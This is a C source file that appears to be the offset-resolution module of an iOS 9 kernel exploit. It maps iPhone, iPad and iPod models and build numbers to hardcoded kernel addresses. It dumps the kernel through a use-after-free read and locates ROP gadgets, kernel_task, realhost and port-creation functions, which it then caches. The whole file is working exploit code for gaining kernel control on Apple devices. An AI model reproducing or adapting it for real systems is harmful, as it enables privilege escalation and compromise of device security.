#include <errno.h>              // errno
#include <stdbool.h>            // bool, true, false
#include <stdint.h>             // uint32_t
#include <stdio.h>              // FILE, asprintf, fopen, fclose, fscanf
#include <stdlib.h>             // free
#include <string.h>             // memcpy, strncmp, strerror
#include <sys/sysctl.h>         // CTL_*, KERN_OSVERSION, HW_MODEL, sysctl

#include "common.h"             // DEBUG, addr_t
#include "find.h"               // find_all_offsets
#include "slide.h"              // get_kernel_slide
#include "try.h"                // THROW, TRY, FINALLY
#include "uaf_read.h"           // uaf_dump_kernel

#include "offsets.h"

#define CACHE_VERSION 1
offsets_t offsets;
static addr_t anchor = 0,
              vtab   = 0;
static bool initialized = false;

enum
{
    M_N94AP,    // iPhone 4s
    M_N41AP,    // iPhone 5
    M_N42AP,    // iPhone 5
    M_N48AP,    // iPhone 5c
    M_N49AP,    // iPhone 5c
    M_N51AP,    // iPhone 5s
    M_N53AP,    // iPhone 5s
    M_N61AP,    // iPhone 6
    M_N56AP,    // iPhone 6+
    M_N71AP,    // iPhone 6s
    M_N71mAP,   // iPhone 6s
    M_N66AP,    // iPhone 6s+
    M_N66mAP,   // iPhone 6s+
    M_N69AP,    // iPhone SE
    M_N69uAP,   // iPhone SE

    M_N78AP,    // iPod touch 5G
    M_N78aAP,   // iPod touch 5G
    M_N102AP,   // iPod touch 6G

    M_K93AP,    // iPad 2
    M_K94AP,    // iPad 2
    M_K95AP,    // iPad 2
    M_K93AAP,   // iPad 2
    M_J1AP,     // iPad 3
    M_J2AP,     // iPad 3
    M_J2AAP,    // iPad 3
    M_P101AP,   // iPad 4
    M_P102AP,   // iPad 4
    M_P103AP,   // iPad 4
    M_J71AP,    // iPad Air
    M_J72AP,    // iPad Air
    M_J73AP,    // iPad Air
    M_J81AP,    // iPad Air 2
    M_J82AP,    // iPad Air 2
    M_J98aAP,   // iPad Pro (12.9)
    M_J99aAP,   // iPad Pro (12.9)
    M_J127AP,   // iPad Pro (9.7)
    M_J128AP,   // iPad Pro (9.7)

    M_P105AP,   // iPad Mini
    M_P106AP,   // iPad Mini
    M_P107AP,   // iPad Mini
    M_J85AP,    // iPad Mini 2
    M_J86AP,    // iPad Mini 2
    M_J87AP,    // iPad Mini 2
    M_J85mAP,   // iPad Mini 3
    M_J86mAP,   // iPad Mini 3
    M_J87mAP,   // iPad Mini 3
    M_J96AP,    // iPad Mini 4
    M_J97AP,    // iPad Mini 4
};

enum
{
    V_13A340,   // 9.0
    V_13A342,   // 9.0
    V_13A343,   // 9.0
    V_13A344,   // 9.0
    V_13A404,   // 9.0.1
    V_13A405,   // 9.0.1
    V_13A452,   // 9.0.2
    V_13B138,   // 9.1
    V_13B143,   // 9.1
    V_13B144,   // 9.1
    V_13C75,    // 9.2
    V_13D15,    // 9.2.1
    V_13D20,    // 9.2.1
    V_13E233,   // 9.3
    V_13E234,   // 9.3
    V_13E236,   // 9.3
    V_13E237,   // 9.3
    V_13E238,   // 9.3.1
    V_13F69,    // 9.3.2
    V_13F72,    // 9.3.2
    V_13G34,    // 9.3.3
    V_13G35,    // 9.3.4
    V_13G36,    // 9.3.5
};

#define MODEL(name) \
do \
{ \
    if(strncmp(#name, b, s) == 0) return M_##name; \
} while(0)

#define VERSION(name) \
do \
{ \
    if(strncmp(#name, b, s) == 0) return V_##name; \
} while(0)

static uint32_t get_model(void)
{
    // Static so we can use it in THROW
    static char b[32];
    size_t s = sizeof(b);
    // sysctl("hw.model")
    int cmd[2] = { CTL_HW, HW_MODEL };
    int ret = sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0);
    if(ret != 0)
    {
        THROW("sysctl(\"hw.model\") failed: %s", strerror(ret));
    }
    DEBUG("Model: %s", b);

    MODEL(N94AP);
    MODEL(N41AP);
    MODEL(N42AP);
    MODEL(N48AP);
    MODEL(N49AP);
    MODEL(N51AP);
    MODEL(N53AP);
    MODEL(N61AP);
    MODEL(N56AP);
    MODEL(N71AP);
    MODEL(N71mAP);
    MODEL(N66AP);
    MODEL(N66mAP);
    MODEL(N69AP);
    MODEL(N69uAP);

    MODEL(N78AP);
    MODEL(N78aAP);
    MODEL(N102AP);

    MODEL(K93AP);
    MODEL(K94AP);
    MODEL(K95AP);
    MODEL(K93AAP);
    MODEL(J1AP);
    MODEL(J2AP);
    MODEL(J2AAP);
    MODEL(P101AP);
    MODEL(P102AP);
    MODEL(P103AP);
    MODEL(J71AP);
    MODEL(J72AP);
    MODEL(J73AP);
    MODEL(J81AP);
    MODEL(J82AP);
    MODEL(J98aAP);
    MODEL(J99aAP);
    MODEL(J127AP);
    MODEL(J128AP);

    MODEL(P105AP);
    MODEL(P106AP);
    MODEL(P107AP);
    MODEL(J85AP);
    MODEL(J86AP);
    MODEL(J87AP);
    MODEL(J85mAP);
    MODEL(J86mAP);
    MODEL(J87mAP);
    MODEL(J96AP);
    MODEL(J97AP);

    THROW("Unrecognized device: %s", b);
}

static uint32_t get_os_version(void)
{
    // Static so we can use it in THROW
    static char b[32];
    size_t s = sizeof(b);
    // sysctl("kern.osversion")
    int cmd[2] = { CTL_KERN, KERN_OSVERSION };
    int ret = sysctl(cmd, sizeof(cmd) / sizeof(*cmd), b, &s, NULL, 0);
    if(ret != 0)
    {
        THROW("sysctl(\"kern.osversion\") failed: %s", strerror(ret));
    }
    DEBUG("OS build: %s", b);

    VERSION(13A340);
    VERSION(13A342);
    VERSION(13A343);
    VERSION(13A344);
    VERSION(13A404);
    VERSION(13A405);
    VERSION(13A452);
    VERSION(13B138);
    VERSION(13B143);
    VERSION(13B144);
    VERSION(13C75);
    VERSION(13D15);
    VERSION(13D20);
    VERSION(13E233);
    VERSION(13E234);
    VERSION(13E236);
    VERSION(13E237);
    VERSION(13E238);
    VERSION(13F69);
    VERSION(13F72);
    VERSION(13G34);
    VERSION(13G35);
    VERSION(13G36);

    THROW("Unrecognized OS version: %s", b);
}

static addr_t reg_anchor(void)
{
    DEBUG("Getting anchor address from registry...");
    uint32_t model = get_model(),
             version = get_os_version();
    switch(model)
    {
#ifdef __LP64__
        case M_N69AP:
            switch(version)
            {
                case V_13G34:   return 0xffffff8004536000;
                default:        THROW("Unsupported version");
            }
        case M_N102AP:
            switch(version)
            {
                case V_13C75:   return 0xffffff800453a000;
                default:        THROW("Unsupported version");
            }
#else
        case M_N78AP:
        case M_N78aAP:
            switch(version)
            {
                case V_13F69:   return 0x800a744b;
                default:        THROW("Unsupported version");
            }
#endif
        default:    THROW("Unsupported device");
    }
}

static addr_t reg_vtab(void)
{
    DEBUG("Getting OSString vtab address from registry...");
    uint32_t model = get_model(),
             version = get_os_version();
    switch(model)
    {
#ifdef __LP64__
        case M_N69AP:
            switch(version)
            {
                case V_13G34:   return 0xffffff80044ef1f0;
                default:        THROW("Unsupported version");
            }
        case M_N102AP:
            switch(version)
            {
                case V_13C75:   return 0xffffff80044f3168;
                default:        THROW("Unsupported version");
            }
        // iPhone??? 9.1 0xffffff80044f7168
#else
        case M_N78AP:
        case M_N78aAP:
            switch(version)
            {
                case V_13F69:   return 0x803ece94;
                default:        THROW("Unsupported version");
            }
#endif
        default:    THROW("Unsupported device");
    }
}

addr_t off_anchor(void)
{
    if(anchor == 0)
    {
        anchor = reg_anchor();
        DEBUG("Got anchor: " ADDR, anchor);
    }
    return anchor;
}

addr_t off_vtab(void)
{
    if(vtab == 0)
    {
        vtab = reg_vtab();
        DEBUG("Got vtab (unslid): " ADDR, vtab);
        vtab += get_kernel_slide();
    }
    return vtab;
}

void off_cfg(const char *dir)
{
    char *cfg_file;
    asprintf(&cfg_file, "%s/config.txt",  dir);
    if(cfg_file == NULL)
    {
        THROW("Failed to allocate string buffer");
    }
    else
    {
        TRY
        ({
            DEBUG("Checking for config file...");
            FILE *f_cfg = fopen(cfg_file, "r");
            if(f_cfg == NULL)
            {
                DEBUG("Nope, let's hope the registry has a compatible anchor & vtab...");
            }
            else
            {
                TRY
                ({
                    DEBUG("Yes, attempting to read anchor and vtab from config file...");
                    // Can't use initializer list because TRY macro
                    addr_t a;
                    addr_t v;
                    if(fscanf(f_cfg, ADDR_IN "\n" ADDR_IN, &a, &v) == 0)
                    {
                        DEBUG("Anchor: " ADDR ", Vtab: " ADDR, a, v);
                        anchor = a;
                        vtab   = v;
                    }
                    else
                    {
                        THROW("Failed to parse config file. Please either repair or remove it.");
                    }
                })
                FINALLY
                ({
                    fclose(f_cfg);
                })
            }
        })
        FINALLY
        ({
            free(cfg_file);
        })
    }
}

void off_init(const char *dir)
{
    if(!initialized)
    {
        DEBUG("Initializing offsets...");
        char *offsets_file,
             *kernel_file;

        asprintf(&offsets_file, "%s/offsets.dat", dir);
        asprintf(&kernel_file,  "%s/kernel.bin",  dir);
        TRY
        ({
            if(offsets_file == NULL || kernel_file == NULL)
            {
                THROW("Failed to allocate string buffers");
            }

            DEBUG("Checking for offsets cache file...");
            FILE *f_off = fopen(offsets_file, "rb");
            if(f_off != NULL)
            {
                TRY
                ({
                    DEBUG("Yes, trying to load offsets from cache...");
                    addr_t version;
                    if(fread(&version, sizeof(version), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read cache file version.");
                    }
                    else if(version != CACHE_VERSION)
                    {
                        DEBUG("Cache is outdated, discarding.");
                    }
                    else if(fread(&offsets, sizeof(offsets), 1, f_off) != 1)
                    {
                        DEBUG("Failed to read offsets from cache file.");
                    }
                    else
                    {
                        initialized = true;
                        DEBUG("Successfully loaded offsets from cache, skipping kernel dumping.");

                        size_t kslide = get_kernel_slide();
                        addr_t *slid = (addr_t*)&offsets.slid;
                        for(size_t i = 0; i < sizeof(offsets.slid) / sizeof(addr_t); ++i)
                        {
                            slid[i] += kslide;
                        }
                    }
                })
                FINALLY
                ({
                    fclose(f_off);
                })
            }

            if(!initialized)
            {
                DEBUG("No offsets loaded so far, dumping the kernel...");
                file_t kernel;
                uaf_dump_kernel(&kernel);
                TRY
                ({
                    // Save dumped kernel to file
                    FILE *f_kernel = fopen(kernel_file, "wb");
                    if(f_kernel == NULL)
                    {
                        WARN("Failed to create kernel file (%s)", strerror(errno));
                    }
                    else
                    {
                        fwrite(kernel.buf, 1, kernel.len, f_kernel);
                        fclose(f_kernel);
                        DEBUG("Wrote dumped kernel to %s", kernel_file);
                    }

                    // Find offsets
                    find_all_offsets(&kernel, &offsets);

                    // Create an unslid copy
                    size_t kslide = get_kernel_slide();
                    offsets_t copy;
                    memcpy(&copy, &offsets, sizeof(copy));
                    addr_t *slid = (addr_t*)&copy.slid;
                    for(size_t i = 0; i < sizeof(copy.slid) / sizeof(addr_t); ++i)
                    {
                        slid[i] -= kslide;
                    }

                    // Write unslid offsets to file
                    FILE *f_off = fopen(offsets_file, "wb");
                    if(f_off == NULL)
                    {
                        WARN("Failed to create offsets cache file (%s)", strerror(errno));
                    }
                    else
                    {
                        addr_t version = CACHE_VERSION;
                        fwrite(&version, sizeof(version), 1, f_off);
                        fwrite(&copy, sizeof(copy), 1, f_off);
                        fclose(f_off);
                        DEBUG("Wrote offsets to %s", offsets_file);
                    }
                })
                FINALLY
                ({
                    free(kernel.buf);
                })
            }

            DEBUG("Offsets:");
            DEBUG("gadget_load_x20_x19                = " ADDR, offsets.slid.gadget_load_x20_x19);
            DEBUG("gadget_ldp_x9_add_sp_sp_0x10       = " ADDR, offsets.slid.gadget_ldp_x9_add_sp_sp_0x10);
            DEBUG("gadget_ldr_x0_sp_0x20_load_x22_x19 = " ADDR, offsets.slid.gadget_ldr_x0_sp_0x20_load_x22_x19);
            DEBUG("gadget_add_x0_x0_x19_load_x20_x19  = " ADDR, offsets.slid.gadget_add_x0_x0_x19_load_x20_x19);
            DEBUG("gadget_blr_x20_load_x22_x19        = " ADDR, offsets.slid.gadget_blr_x20_load_x22_x19);
            DEBUG("gadget_str_x0_x19_load_x20_x19     = " ADDR, offsets.slid.gadget_str_x0_x19_load_x20_x19);
            DEBUG("gadget_ldr_x0_x21_load_x24_x19     = " ADDR, offsets.slid.gadget_ldr_x0_x21_load_x24_x19);
            DEBUG("gadget_OSUnserializeXML_return     = " ADDR, offsets.slid.gadget_OSUnserializeXML_return);
            DEBUG("frag_mov_x1_x20_blr_x19            = " ADDR, offsets.slid.frag_mov_x1_x20_blr_x19);
            DEBUG("func_ldr_x0_x0                     = " ADDR, offsets.slid.func_ldr_x0_x0);
            DEBUG("func_current_task                  = " ADDR, offsets.slid.func_current_task);
            DEBUG("func_ipc_port_copyout_send         = " ADDR, offsets.slid.func_ipc_port_copyout_send);
            DEBUG("func_ipc_port_make_send            = " ADDR, offsets.slid.func_ipc_port_make_send);
            DEBUG("data_kernel_task                   = " ADDR, offsets.slid.data_kernel_task);
            DEBUG("data_realhost_special              = " ADDR, offsets.slid.data_realhost_special);
            DEBUG("off_task_itk_self                  = " ADDR, offsets.unslid.off_task_itk_self);
            DEBUG("off_task_itk_space                 = " ADDR, offsets.unslid.off_task_itk_space);
            DEBUG("OSUnserializeXML_stack             = " ADDR, offsets.unslid.OSUnserializeXML_stack);
            DEBUG("is_io_service_open_extended_stack  = " ADDR, offsets.unslid.is_io_service_open_extended_stack);
        })
        FINALLY
        ({
            if(offsets_file != NULL) free(offsets_file);
            if(kernel_file  != NULL) free(kernel_file);
        })
    }
}
